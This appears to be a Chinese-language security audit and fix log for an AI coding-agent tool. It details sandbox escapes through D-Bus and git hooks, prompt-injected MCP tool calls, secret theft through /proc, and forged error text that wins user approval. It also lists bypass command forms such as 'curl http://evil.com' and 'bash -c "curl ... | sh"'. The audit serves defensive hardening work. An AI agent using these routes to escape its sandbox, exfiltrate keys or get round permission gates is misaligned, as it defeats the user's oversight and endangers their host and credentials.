# bugent 安全审计 buglist

> **修复进度**：BUG-001~029 全部完成（011 含模糊匹配唯一性；012 含 apply 提交复核；019 两阶段回滚；021 marker 顶格识别；023 能力授权进审计；024 定时器泄漏 + 询问串行化；025 技能加载降级；029 spawn 内联校验），PERF-001~006 全部完成（006 仅剩 resize 增量渲染一项暂缓，建议单独立项），全量 **1269 pass / 0 fail**。
>
> **用户定夺记录（2026-09-26）**：BUG-008=C 保持字面匹配+文档明示；BUG-013=C 不校验 baseUrl、只修导出泄漏；BUG-014=B 首次执行前确认（路径+SHA256，哈希记忆免重复确认，--yes 跳过，无 TTY fail-closed）；BUG-016=C 不遮蔽 ~/.bugent、只修 output 目录 0700；PERF-002=超出保留窗口移出内存、点击后从会话消息（SQLite 持久层）整体回放。
>
> **环境残留处理**：本仓库 `.git/config` 里有一条悬空的 `core.fsmonitor = .git/hooks/fsmonitor-watchman`（指向不存在的文件，即 BUG-003 的现实样本，每次 git status 产生 fatal 噪音）——已 `git config --unset core.fsmonitor` 移除；如需恢复：`git config core.fsmonitor .git/hooks/fsmonitor-watchman`。

- 生成方式：未读 `docs/`、`README`；5 个并行子代理分区审计（沙箱/原生 C、权限与 bash 授权、patch/文件工具、MCP/配置/Provider、存储/TUI），主审逐条复核源码；标注【实测】的条目做过实证复现。
- 严重级：P0 = 可自主触发的沙箱逃逸/RCE；P1 = 高危（逃逸前置条件少或核心安全设计被击穿）；P2 = 中危；P3 = 低危/加固项。性能问题单列。

---

## P0

### BUG-001 沙箱逃逸：bwrap 未隔离 `/run`，Unix socket 通道直通宿主机【已修复：`--tmpfs /run`，真实沙箱测试通过】
- 位置：`src/sandbox/bwrap.ts:57-75`
- 问题：挂载表只有 `--ro-bind / /`、`--dev /dev`、`--proc /proc`、`--tmpfs /tmp`。`/run`、`/var/run` 保持宿主机只读挂载。`--unshare-net` 只隔离网络命名空间，不管 `AF_UNIX`；bwrap 路径无 seccomp。
- 攻击路径：沙箱内命令连接 `/run/user/<uid>/bus`（实测 `srw-rw-rw-`，同 uid 可连；mount 只读不阻止 `connect()`）→ `systemd-run --user` / busctl `StartTransientUnit` → **宿主机上以用户身份执行任意代码，脱离沙箱**。同通道可达 ssh-agent socket（给用户私钥签名）、gnome-keyring。`systemctl/busctl/systemd-run` 不在写/联网扫描表 → scan 为 clean，workspace-write 档零弹窗自动执行。
- 修法：
  1. `buildSandboxArgv` 增加 `--tmpfs /run`、`--tmpfs /var/run`、`--tmpfs /run/user`（并考虑 `--unshare-all` + 按需显式 rebind）；
  2. 把 dbus/systemd-run/busctl 等本机 IPC 网关命令纳入扫描表（防漏弹窗）；
  3. 回归测试：沙箱内 `ls /run/user` 应为空。

### BUG-002 静默 fail-open：无 bwrap 时 bash 完全无内核隔离仍自动放行【已修复：`requireApprovalEveryRun`，缺 bwrap 时逐条询问】
- 位置：`src/tools/builtin.ts:112-117`（`createShellRunner()` 兜底）；前提声明在 `src/permission/mode.ts:12-16`、`gate.ts:227-236`
- 问题：`isSandboxAvailable()==false` 时只换一行提示文案，bash 照常自动放行。read-only 档"内核保证 bash 改不了任何东西"的安全论证失效，命令扫描的所有漏判（见 BUG-007）全部变成**未提示的真实写/真实联网**。macOS 与未装 bwrap 的 Linux 默认落入此分支。
- 修法：缺 bwrap 时把 bash 工具的每条命令改为 `ask`（`authorizeBeforeRun` 语义收紧），或在启动时 fail-fast 要求安装 bwrap；至少要在 read-only 档直接拒绝执行 bash 而不是降级。

---

## P1

### BUG-003 git 集成在沙箱外执行仓库可控代码，且携带全量环境变量【已修复：`-c` 禁 hooks/fsmonitor + env 白名单 + filter 检测 fail-closed；hook 触发实测前后对比见测试】
- 位置：`src/agent/git.ts:90-102`（`...process.env` 全量继承、无 hook 抑制）、`:331-335`（`worktree add` → post-checkout/reference-transaction hook）、`:356-371`（`add -N`/`diff`/`status` → `core.fsmonitor` 可执行任意命令）
- 问题：`GitWorktreeManager` 的所有 git 调用不在沙箱内、不过权限闸门。模型在工作区内写 `.git/hooks/post-checkout` + `chmod +x`（工作区写是默认批准的，且 `.git/` 内容不影响 `git status` 的 clean 判定），随后任何 worker 子代理创建 worktree 即触发 hook。
- 攻击路径：write_file 写 `.git/hooks/post-checkout` → bash `chmod +x`（沙箱内合法）→ worker 创建时 `git worktree add` 在沙箱外执行 hook，环境变量含全部 API key → 密钥外带 + 主机任意执行。
- 修法：
  1. `runGit` 统一追加 `-c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.pager=cat -c extensions.devVerify=...`（禁 hook/fsmonitor）；
  2. `env` 改用 `sanitizeEnv(process.env)` 白名单；
  3. hook 文件目录（`.git/hooks/`）纳入文件工具的只读保护或写入时告警。

### BUG-004 MCP 工具在所有档位自动放行（含 read-only）【已修复：默认 `ask`；no-sandbox 档在组装策略时升回 allow，用户显式规则不受影响；`readOnlyHint` 不再参与锁判定】
- 位置：`src/mcp/tools.ts:92`（`defaultPermission:"allow"`、无 `requires`）→ `src/tools/types.ts:265-271`（编成 allow 规则）→ `src/permission/policy.ts:108-115`（first-match）→ `src/tools/types.ts` MCP 工具不设 `requires` → `gate.ts:184-206` 第 2 步永不触发
- 问题：任何 prompt injection（读到的文件、网页、工具输出）可直接驱动 `mcp__server__tool`，MCP server 启动时被授予的能力（可配 `workspaceWrite`、`network: all`、exec roots）即刻可用，全程零确认。对比 `src/tools/agent.ts:270` 子代理工具用的是 `"ask"`。另有 `readOnlyHint`（`mcp/tools.ts:79,95-97`）完全信任远端声明，可把写工具降级成 read 锁。
- 修法：MCP 工具默认 `defaultPermission:"ask"`（或按 server 粒度可配）；把 `readOnlyHint=true` 降级为"仅用于展示文案"，不参与资源判定；给 MCP 工具补 `requires`（如 server 带 network 时要求 network 能力），让闸门第 2 步生效。

### BUG-005 Landlock 对 `/proc` 整体读授权击穿环境变量白名单【已修复：provider.c 在 apply()（子进程侧）把 `/proc` 展开为 `/proc/self` + 静态探测文件，`proc-narrow-test.c` 实测 parent environ DENIED】
- 位置：`src/sandbox/policy.ts:100`（`RUNTIME_READ_ROOTS` 含 `"/proc"`），消费于 `compileMcpSandbox:321-399`
- 问题：Landlock 授予全 `/proc` 的 READ_FILE|READ_DIR。沙箱内 MCP 子进程（同 uid）读 `/proc/self/status` 拿 `PPid`，再读 `/proc/<ppid>/environ` 即可拿回被 `sanitizeEnv` 剥掉的父进程全部环境变量（yama `ptrace_scope=1` 只限制 ATTACH 模式，不拦 READ 模式；本机实测 yama=1）。`env.ts` 白名单设计被整体绕过。
- 修法：从 `RUNTIME_READ_ROOTS` 去掉 `/proc`，只按 Bun 启动探测需要逐项授权（如 `/proc/self/...`、`/proc/filesystems` 等具体条目）；父进程启动时 `prctl(PR_SET_DUMPABLE, 0)` 兜底；长期方案是 Bun fork 内改用不依赖全 procfs 的探测。

### BUG-006 provider 返回的 `tool_call.id` 未校验即拼进磁盘路径（任意路径写）【已修复：loop 入口 `safeToolCallId` 规整 + spill 落盘 `assertPathSegment` 兜底】
- 位置：`src/provider/adapters/openai-chat.ts:264-267`（`id = call.id ?? call_${index}` 原样采信）→ `src/core/loop.ts:385`（`callId: call.id`）→ `src/tools/spill.ts:58,63-65,88`（`${dir}/${callId}.txt`、`.${callId}.stdout.tmp`）
- 问题：`callId` 无任何字符校验、无 `resolveWithin`。基目录已存在，`../` 逃逸无需建父目录即可落盘任意路径（固定 `.txt`/`.stdout.tmp` 后缀），`mkdir` 还会创建目录树。前提：恶意/被篡改的 provider 端点——而 config 允许 `tls.rejectUnauthorized=false`，前提可被满足。
- 修法：在 `createOutputSpool`/`spillOutput` 入口（最好在 `ToolCtx` 构造处）强校验 `callId` 与 `sessionId`：`/^[A-Za-z0-9_-]{1,128}$/`，不匹配直接拒绝该次落盘；`tempOutputPath` 改用 `mkdtemp`。

### BUG-007 命令扫描与真实 shell 系统性分歧（逐条实测）——叠加 BUG-002 即为无提示任意写【已修复：`>&file` 记录、wrapper 选项值跳过、`sed -i` 组合形态、`~user` 判不出、`cp -t` 目标、`eval` 按写意图+联网迹象处理；六项均有回归测试】
- 位置：`src/sandbox/command-scan.ts`
- 实测确认的漏判（均返回 clean、不弹窗，真实 bash 会执行）：
  - `echo x >& ~/.bashrc`：`:49` 把 `>&` 列为双字操作符，`:177-178` 吃掉目标词但不记录（`&>` 反而记录了，`:132`）；
  - `sudo -u root tee /home/.../pwned`、`env -u FOO curl http://evil.com`：`commandNameOf:423-435` 只跳过选项 token 不跳过选项的值，真实命令名丢失；
  - `sed -i.bak` / `--in-place=X` / `perl -pi.bak`：`:500-503` 只精确匹配 `-i`；
  - `~user/...` 目标被当工作区内路径（`expandTarget:399-406` 只处理 `~`/`~/`）；
  - `cp -t /etc a b`、`mv -t`：`:493-497` 只取最后一个操作数；
  - 解释器体内的写/联网完全不可见（`bash -c "curl ... | sh"`、`python3 -c "urllib..."`），且 `eval` 不在 WRAPPERS。
- 修法（结构性）：
  1. 三处解析器统一：扫描（`command-scan.ts`）、锁分类（`bash.ts:468-523`）、真实执行（`bash -lc`）应共享同一份解析结果，至少补齐 `>&file` 记录、wrapper 值跳过（`-u X`、`-uX`、`--user=X`）、`sed -i<suffix>`/`--in-place*` 前缀匹配、`~user` 展开；
  2. 认可"漏判≠放行"只在有内核兜底时成立：把"clean"分级为 clean-with-kernel / clean-unsandboxed，后者强制 ask（呼应 BUG-002）。

### BUG-008 用户 deny 规则按原始命令串匹配，可被平凡绕过（实测）【按用户决定 C 处理：不改实现；`src/permission/policy.ts` 头注释与 bugent.config.example.ts 已明示字面匹配的局限与替代手段】
- 位置：`src/permission/policy.ts:66-81`（globToRegExp）、`:108-115`（first-match on 原始文本）、`src/tools/bash.ts:719-725`（`resource` = 原始命令串）
- 问题：deny `rm -rf /*` 对 `env rm -rf /`、`sudo rm`、`bash -c "rm -rf /*"`、`rm${IFS}-rf`、`\rm`、引号/大小写/换行变体全部不命中 → 默认 `allow` → 自动执行。
- 修法：deny 规则的语义改为"意图级"——对 bash 资源用 `(command, 解析后的命令名集合)` 匹配而非原始串；或文档明示 deny 对 bash 只按字面匹配、并强制这类 deny 落在 gate 层（命中即 deny，不分档位）+ 把 wrapper 归一化后复查。

---

## P2

### BUG-009 联网兜底授权的"真实报错"可由模型伪造，且命令执行两遍【已修复（重估为低危）：弹窗文案改诚实——明示报错摘录来自命令自身输出、不保证真实，并展示退出码；重跑天然最多一次。前提澄清：沙箱是否断网由配置决定，不依赖报错文本，伪造只能影响用户是否批准】
- 位置：`src/tools/bash.ts:82-107`（`/connection refused/i` 等泛化模式）、`:810-838`
- 问题：`sh -c 'echo could not connect to server; exit 1'`（scan clean，实测）→ 首跑失败匹配模式 → 弹窗"允许联网后重跑吗？报错：could not connect to server" → 批准后带网重跑。报错文案完全由模型控制；副作用也执行了两次。
- 修法：报错来源改为沙箱特征（如检查 `--unshare-net` 下 loopback down 的专属错误前缀/errno），或对比"同命令沙箱内 exit code + 沙箱特征码"而非内容匹配；首跑失败即展示完整命令并默认不重跑。

### BUG-010 授权后 bind 放大：子串 `~` 触发整个 `$HOME` 可写；祖先爬升 bind 过宽【已修复：`mentionsHome` 改为词级+注释感知+引号内引用识别（lex 增加 startedWithQuote）；敏感目录（.ssh/.gnupg/.aws/.config/.bugent）从 binds 中过滤——批准后写仍会被内核挡住，目标如实展示；测试覆盖注释误触发、引号内引用、敏感 bind 拦截】
- 位置：`src/sandbox/command-scan.ts:597-600`（`mentionsHome` 是子串测试）、`:629-631`（writeIntent + mentionsHome → bind 整个 home）、`:542-560`（`writableAncestors` 爬到最近存在祖先，目标不存在时直接 bind 其父目录）
- 问题：解释器命令 + 注释里出现 `~` 即可在批准一次后把 `~/.ssh`、`~/.bashrc` 全部变为该次运行可写；弹窗虽有披露但批准范围与用户心智模型脱节。审批期 `statSync` 探测与 spawn 期 `--bind` 之间还有 TOCTOU（并发工具调用可把探测目录换成指向 `~/.ssh` 的符号链接）。
- 修法：`mentionsHome` 改为解析出的 token 级匹配；bind 前重新 `realpath` 并校验目标仍是目录、不在敏感清单（`~/.ssh`、`~/.gnupg`、`~/.aws`、`~/.config`）；bind 生成时记录 inode 并在 spawn 前复核。

### BUG-011 patch 引擎可静默毁文件（多处）【全部已修复：EOF chunk 游标、纯插入锚点、Update+Move 同路径守卫、Add File 存在性检查、非 UTF-8 拒编辑、模糊匹配要求文件内唯一命中（多义即报错）；测试 tests/apply-patch-apply.test.ts】
- 位置与问题（均已核对源码）：
  1. `*** End of File` chunk 忽略行游标：`seek-sequence.ts:45-50`（normalize-lf 分支丢弃 `start`，与 preserve 分支的 `Math.max` 不一致）→ 与前序 chunk 产生重叠区间，`file-update.ts:112-123` 按降序 splice 用过期下标 → 已替换内容被删、未匹配行被移除，无任何报错；
  2. 纯插入 chunk 校验了 `@@` 锚点却永远插到 EOF：`file-update.ts:61-68`（`lineIndex` 被丢弃）；连续两个纯插入 chunk 同下标，反向 splice 交换顺序；
  3. `*** Update File:` + `*** Move to:` 同一路径 → `states.set(dest)` 后被 `states.set(source, undefined)` 覆盖 → 文件被删（`apply.ts:120-124`，无同路径守卫）；
  4. `*** Add File:` 无存在性检查，静默覆盖既有文件（`apply.ts:101-104`；对比 Delete File 有 missing 检查 `:95`），且摘要记成 `M` 掩盖覆盖；
  5. 非 UTF-8 文件被整体 U+FFFD 重写：`apply.ts:49,161`、`files.ts:515,547`（NUL 检查挡不住 GBK/latin-1）；
  6. 模糊匹配（trim/unicode 归一）取第一个命中即落点，可能改错位置（`seek-sequence.ts:55-68`）。
- 修法：
  1. normalize-lf 分支同样 `Math.max(start, lines.length - pattern.length)`；
  2. 纯插入分支使用 `lineIndex`（有锚点时插锚点后），并按插入顺序累积偏移；
  3. `movePath === path` 时报错；Add File 先 `stat`，存在即报错（或要求 `*** Overwrite File:` 显式意图）；
  4. 编码探测：非 UTF-8 字节序列直接拒绝编辑（`TextDecoder("utf-8",{fatal:true})`）；
  5. 模糊匹配要求文件内唯一命中，否则报错。

### BUG-012 文件写路径 TOCTOU（解析时防符号链接，写入时不防）【已修复：`src/tools/atomic-write.ts` 四次边界复核 + 随机 temp + `wx`；write_file/edit_file/undo-write 已接入；apply.ts 提交循环补 staging/rename/unlink 前后边界复核（授权放宽时自动豁免）；undo 双读比对由 BUG-019 的 preCommit 快照覆盖；测试 tests/atomic-write.test.ts】
- 位置：`src/tools/paths.ts:87-116`（检查只在 resolve 时）vs `src/tools/files.ts:381,389-400`、`src/patch/apply.ts:158-176`（`mkdir`/`writeFile`/`rename` 会穿透中间目录符号链接）
- 问题：并行工具批内（`loop.ts:375-402` `Promise.all`）一次 `bash: rm -rf dir && ln -s /etc dir` + 一次 `write_file: dir/passwd`，只要 `ln` 落在 resolve 与 rename 之间即写到工作区外；可循环重试放大窗口。同类：write_file/edit_file 的 `existed→stat→read→rename` 竞态会污染 undo 记录（并发创建的文件被 undo 当作"新建"而删除，`workspace-undo.ts:113-115`）；temp 文件名可预测（`files.ts:392,544`），`rename` 未用 `flag:"wx"`。
- 修法：rename 前对父目录链重新 `lstat`/`realpath`；或整条写路径改 `openat2(RESCOLVE: NO_SYMLINKS|IN_ROOT)` / `fs.open(..., "wx")` + `fchmod`；undo 记录改为写入前后各 `stat`+hash 双读比对。

### BUG-013 provider profile `baseUrl` 无校验 → API key 发往任意主机；`headers/proxy` 绕过"不导出 apiKey"不变量【按用户决定 C 处理：baseUrl 不校验；导出侧已修——headers 鉴权键、proxy userinfo、extraBody 深度密钥形态扫描统一替换为 `__REDACTED__`（`provider-profiles.ts` redact*），测试覆盖】
- 位置：`src/core/provider-profiles.ts:158-181`（baseUrl/proxy/headers 无 host 校验，导出时原样复制）、`src/store/repository.ts:297-306`（持久化只剥离 `apiKey` 键）、`src/provider/adapters/openai-chat.ts:375,385`、`src/provider/model-window.ts:87-97`（probe 即发 key）
- 问题：被篡改/共享的配置把 `baseUrl` 指向攻击者主机 → 会话恢复或上下文窗口探测时 Bearer key 直接送出（SSRF+密钥外带）。`headers.Authorization`/`proxy.user:pass`/`extraBody` 里的密钥随导出和落库泄漏。`tls.rejectUnauthorized:false` 可经配置开启 MITM。
- 修法：`parseProviderProfiles` 校验 `baseUrl` 必须为 https 且非 localhost/私网（或首次保存时确认）；导出/落库前对 `headers`/`proxy`/`extraBody` 做密钥形态扫描并要求显式 `includeSecrets` 开关；`rejectUnauthorized:false` 保存时强提示。

### BUG-014 启动即执行项目 `bugent.config.ts`（任意代码执行，零确认）【按用户决定 B 已修复：`config/load.ts` 确认门——首次/哈希变化时经入口注入的 `confirmProjectConfig` 展示路径+SHA256 并确认，信任记录 `~/.bugent/trusted-project-configs.json`，同哈希免提示；`--yes` 跳过；无 TTY fail-closed 拒绝；导入 URL 带哈希防 Bun 模块缓存取旧实例；测试 tests/config-gate.test.ts。TUI 原生弹窗为后续增强（当前终端 readline，发生在 TUI 启动前）】
- 位置：`src/config/load.ts:15,35-48,86-90`（`import(pathToFileURL(path))`，cast 后不经任何 schema 校验）
- 问题：cd 进不可信仓库并启动 bugent = 仓库内 `bugent.config.ts` 以用户身份执行；还能注册任意 `cmd`/`baseUrl` 的 provider/MCP，绕过 TOML 层全部类型检查。
- 修法：项目级 config 只接受 `bugent.config.toml`（数据）；`.ts/.js` 版本仅当位于用户主目录或首次哈希确认后加载；至少在首次执行前弹窗展示文件路径+哈希。

### BUG-015 MCP stdio 健壮性：string-id 挂死、无超时、入站 buffer 无上限【已修复：String(id) 匹配、initialize/tools/list 30s 超时、32MB 缓冲上限超限杀 server、ctx.signal 打断在途请求；传输层回归测试 tests/mcp-stdio.test.ts】
- 位置：`src/mcp/stdio.ts:380-381`（非 number id 直接丢弃）、`:295-307`（request 无超时，`ctx.signal` 只在调用前检查）、`:348-369`（无 `\n` 时 `#buffer` 无上限 OOM 父进程）
- 修法：接受 string id；`request()` 统一超时（复用 `withAuthorizationWindow` 模式）并把 abort 接进 `ctx.signal`；入站 buffer 设上限（如 32MB）超限杀子进程。

### BUG-016 敏感信息落盘权限与位置【按用户决定 C 处理：配置文件 0600 已做（上一轮）、工具输出目录 `~/.bugent/output/` 改 0700（`spill.ts`）；`~/.bugent` 不遮蔽——维持"读自由"设计取舍】
- 位置：`src/config/toml.ts:608-612`（含 `api_key` 的配置文件 0644 落盘）；`src/tools/spill.ts:85-88`（工具完整输出落 `~/.bugent/output/` 未设 0700/0600）；`~/.bugent/` 在 bwrap 只读挂载下对沙箱内可读（BUG-001 同面）
- 修法：`ensureConfigFile` 写后 `chmod 0600`；output 目录 `mkdir(...,{mode:0o700})` + 文件 0600；bwrap 加 `--ro-bind` 后对 `~/.bugent/credentials` 类路径显式遮蔽（`--tmpfs` 覆盖）。

### BUG-017 原生 provider（C）加固项【部分已修复：seccomp 新增常开的进程加固段——ptrace / process_vm_readv/writev / pidfd_open/getfd/send_signal / kcmp / keyctl / add_key / request_key 全部 EPERM，且与 network 模式无关（network=all 的 MCP server 同样受保护）；`proc-narrow-test.c` 双模式实测 process_vm_readv DENIED。暂缓：realpath→open TOCTOU、exec 目标目录放宽告警、apply() fail-closed 契约、close_range 门槛说明】
- 位置：`native/sandbox/provider.c`
- 问题：
  1. seccomp deny list（`:711-739`）缺 `ptrace`、`process_vm_readv/writev`、`pidfd_open/getfd`、`kcmp`、`keyctl` —— yama 缺失/`ptrace_scope=0` 的主机上同 uid 可读写父进程内存（→ 完全逃逸）；
  2. `add_landlock_path_rule:594-601` realpath→open 两步 TOCTOU（并发换路径时规则绑到不同 inode）；
  3. 非目录 exec 目标静默放宽到整个父目录（`:613-653`）；
  4. `apply()` 失败是否 fail-closed 取决于 fork 侧调用方；`close_range` 需要 kernel ≥5.11；`ruleset_fd` 未 `O_CLOEXEC`。
- 修法：deny list 补齐上述系统调用（或改 default-deny allowlist）；用 `open(O_PATH)`+`/proc/self/fd` 一次解析；exec 目标按文件粒度授权并向上告警；fork 侧把 `apply() != 0` 视为致命（fail-closed）；`ruleset_fd` 加 `O_CLOEXEC`。

---

## P3（择要，修法从简）

- **BUG-018** `apply_patch`/`edit_file` 大文件全量进内存。修法：读前 `stat` 限尺寸。【已修复：`MAX_PATCH_TARGET_BYTES`=64MB，apply 与 edit 读前拒绝】
- **BUG-019** undo 非原子：半途失败留半套回滚。【已修复：preCommit 快照 + 提交失败按逆序恢复 + 回滚失败合并报错，tests/workspace-undo.test.ts】
- **BUG-020** undo/restore 丢文件权限位。修法：写入前 `stat` 保留 mode。【已修复：workspace-fs.write 传入原 mode】
- **BUG-021** 补丁 marker 行（`*** ` 开头的上下文行）被 streaming-parser 误判为 header。【已修复：update/add 模式只认"顶格"头标记（trimEnd 不 trimStart），` *** xxx` 是上下文内容；测试 tests/apply-patch-apply.test.ts】
- **BUG-022** `read_file` 超过 8MB 扫描上限后 continuation 提示指向永不前进的 offset。【已修复：如实报"扫描窗永远从文件头开始"，并建议 `sed -n 'START,ENDp'` 读取深处】
- **BUG-023** 能力授权（writeOutside/network）不进 gate 审计流水。【已修复：AuditTrail 新增 `capability` 事件（capability/reason/outcome），index.ts 的 onRequestCapability 组合层统一记录，AuditEventKind 升级】
- **BUG-024** `authorization.ts` 同步抛异常泄漏 60s 定时器；`prompt.ts` 并发弹窗共用一个 readline 显示错位。【已修复：request 调用包 async IIFE 使同步异常也走清理；StdinPrompter 加 #runExclusive 串行化】
- **BUG-025** 技能加载：单个坏 `SKILL.md` 使启动整体失败；项目技能同名遮蔽用户技能。【已修复：坏文件/同名冲突降级为 stderr 告警并跳过（高优先级 root 获胜），tests/skills.test.ts】
- **BUG-026** `config/toml.ts` 类型收窄。【已修复：extra_body 必须为表、max_steps 正整数，测试覆盖（tests/small-fixes.test.ts）】
- **BUG-027** MCP/HTTP 错误文案（含远端可控内容）未过滤 ANSI 直进终端。【已修复：`src/util/sanitize.ts` stripAnsi，应用于 mcp stdio 错误/退出详情与 openai-chat HTTP 错误体】
- **BUG-028** `bashResourceClaims` 分割不含 `\n`（`bash.ts:520`）：`ls\nrm ...` 被判 read 锁。修法：分割集合同步 scanner 的分隔符集。【已修复】
- **BUG-029** `assertBugentBunRuntime` 只在 MCP spawn 调用点保证。【已修复：校验内联进 `spawnSandboxed` 自身，标准路径不可能绕过；测试缝隙（注入 spawn）显式豁免】
- **BUG-030** 已验证干净、无需修改：`paths.ts` 的静态路径逃逸防护、`db.ts` SQL 全参数化、`partial-json`/tokenizer 无崩溃性输入、`env.ts` 白名单本身、gate 的 timeout=fail-closed 与 deny 优先序。

---

## 性能问题（PERF，按影响排序）

### PERF-001 每步模型调用前全量序列化+哈希整个上下文 —— P1【已修复：Merkle 式增量前缀链（`context.ts` chainStep + `session.ts` #chainSteps 惰性扩展，任意 upto O(1) 查表），extensionRole 变化/乱序 restore 自动降级重算；`lastMsgId` 改 O(1) 缓存；回归测试 tests/context.test.ts】
- 位置：`src/core/loop.ts:252`（`noteContextSent()`）→ `src/core/session.ts:404-411` → `src/core/context.ts:17-58,87-96`
- 影响：O(全部上下文字节)/步 × 最多 800 步/轮，同步阻塞事件循环，10k 消息会话每步数 MB 字符串 + GC。
- 修法：增量化——保留 `Bun.CryptoHasher` 状态，只对新增尾部消息 `update()`；或把 prefixHash 改为惰性（仅 provider 需要 dedup 探测时算）。

### PERF-002 TUI 永不淘汰全量 tool 输出（≈3 份副本常驻）—— P1【已修复（按用户设计）：Transcript 保留窗口（默认 400 条，可配）——窗口外已完成条目正文/结构化展示移出内存，渲染为"已释放"占位；点击占位卡片 → `rebuildFrom()` 从会话消息（SQLite 持久层）整体回放；清扫带高水位 O(n)；测试 tests/transcript-eviction.test.ts。注：session.messages 本身必须常驻（provider 上下文来源），本修复消除的是 transcript 的 ≈2 份冗余拷贝】
- 位置：`src/tui/transcript.ts:501-528`（`item.output` 存原文）、`src/tui/transcript-layout.ts:80,160-192`（`#blocks` 强引用全部渲染行，折叠卡片也整段渲染）、`src/tui/app.ts:3423-3430`（结果原文进 item）
- 影响：大输出会话数百 MB 常驻；分支切换/恢复全量重放秒级卡顿。
- 修法：`DisplayItem.output` 超过阈值（如 64KB）后替换为"溢出文件路径 + 摘要"，完整版已有 spill 文件可指；`#blocks` 对滚动窗口外的块只保留 `lines.length` 与惰性重建句柄。

### PERF-003 tokenizer：CJK/长单段 piece O(n²)，缓存满后永久 miss —— P2【已修复：`preTokenize` 输出按 128 符号切片（正常文本逐字节不变，超长片段估算有微小偏差——宁可略偏不冻结）；缓存改 LRU（命中刷新 + 满时淘汰最旧），长会话命中率不再归零；测试：30 万字符病态用例 <2s（实测 16ms）+ LRU 淘汰后计数一致，tests/tokenizer.test.ts】
- 位置：`src/util/tokenizer.ts:77-84`（CJK 连续段整体成 piece）、`:156-178`（每次合并全量重扫 pair + 拷贝数组）、`:191`（8192 上限后永不缓存）
- 影响：1MB 中文/长 base64 段 ≈10¹² 次操作，UI 冻结数分钟；长会话命中率归零。
- 修法：piece 长度 >N（如 256）时按 BPE 已知 merge 优先级用堆/链表增量合并（O(n log n)）；缓存改 LRU；或长 CJK 段退化为按字符计数近似 + 上限截断并标注。

### PERF-004 流式 tool args 每 delta 全量 JSON.parse（O(L²)）—— P2【已修复：loop.ts 解析条件化（无 hook 不解析）+ 40ms 节流（执行用精确解析仍在流结束后）；PatchStreamProgress 改可续位增量解码（`decodeJsonStringPrefix` 从上次消费位续跑）+ `liveHunks()` 只读视图替代每 delta 深拷贝；测试：3000 行 patch 分 2000 增量 <2s（实测 93ms），tests/apply-patch-streaming.test.ts】
- 位置：`src/core/loop.ts:284-291`（参数对象在可选链求值前构造，无 hook 也照跑；未闭合 JSON 每 delta 全串扫描）+ app 侧 `app.ts:3372,3381` / `file-progress.ts:60-63` / `streaming-progress.ts:104-126`（每 delta 全量重扫 `rawArgs`，patch 进度还深拷贝全部 hunks）
- 修法：delta 回调只传增量，累积解析交给消费方节流（如每 50ms 或每 N KB 一次）；`hunks()` 深拷贝改为冻结只读视图。

### PERF-005 每条消息一个同步 SQLite 事务 + FULL fsync —— P2【已修复：`PRAGMA synchronous = NORMAL`；事务合并未做】
- 位置：`src/store/repository.ts:437-509`（每条消息独立 `tx.immediate()`）、`src/store/db.ts:468-469`（未设 `synchronous=NORMAL`）
- 修法：`PRAGMA synchronous=NORMAL`（WAL 下进程崩溃仍安全）；按工具批/turn 合并事务。

### PERF-006 全量重渲染与 O(n) 热路径杂项 —— P2/P3
- resize/高亮就绪 → 单帧内重渲染全部块（`transcript-layout.ts:115-192`，WeakMap 缓存整表失效）：改增量（只重排受影响块 + 视口内块）。
- `lastMsgId` 每次追加线性扫（`session.ts:537` + `context.ts:99-103`）：msgid 单调递增，直接取末元素/维护尾指针。【已修复：#lastMsgIdCache，随 PERF-001】
- `#todos` 每条新消息全历史重扫且 join 全部工具输出（`app.ts:4221-4232`）：缓存键改最后 msgid，只扫上次 `todo_write` 之后的尾部。【已修复：水位缓存 + 尾部三类触发才重算（新 todo_write / todo 失败结果 / user 消息）】
- `messages` 表重复索引 `idx_messages_session` 与主键同构（`db.ts:276`）：删除。【已修复：v11 迁移 DROP，测试断言索引不存在】
- `runtime/bun/src/index.ts:73-81`：`assertBugentBunRuntime` 同步读整个 Bun 二进制（~百 MB×2）算 SHA-256；按 `(realpath,size,mtime)` 缓存结果。【已修复：executableHashCache】
- `scanCommand`/`planWriteApproval` 在 no-sandbox 档结果被丢弃仍每次计算（`bash.ts:774-782`）：按档位短路。
- v1→v2 迁移相关子查询全表重写（`db.ts:360-370`）：一次性，仅需文档标注大库迁移耗时。
- `partial-json.ts:160-166`：字段定位每 push 从 0 重扫并完整解码途经字符串（字段前置大字符串时 O(n²)）：记住已扫描水位，途经字符串只记长度不解码。
- `seek-sequence.ts:55-68`：失败时最多 4 轮 O(n·m) 扫描 + 每行归一化分配：先做一次归一化缓存数组再复用。
- `apply_patch` 单次调用解析至多 4 遍（`apply-patch.ts:57,105,131,142`）：解析结果在 tools 层缓存复用。

---

## 修复优先级建议

1. **立即**：BUG-001（两行 `--tmpfs /run`）、BUG-003（git 加 `-c core.hooksPath=/dev/null -c core.fsmonitor=false` + env 白名单）——两者都是"模型可自主触发的沙箱外任意代码执行"。
2. **本周**：BUG-002（fail-open 改 ask）、BUG-004（MCP 默认 ask）、BUG-005（`/proc` 收窄）、BUG-006（callId 校验）。
3. **随后**：BUG-007/008（解析统一 + deny 语义）、BUG-011/012（patch 与写路径数据安全）、BUG-013/014（供应链/配置面）。
4. **性能**：PERF-001、PERF-002 收益最大，PERF-003 次之。
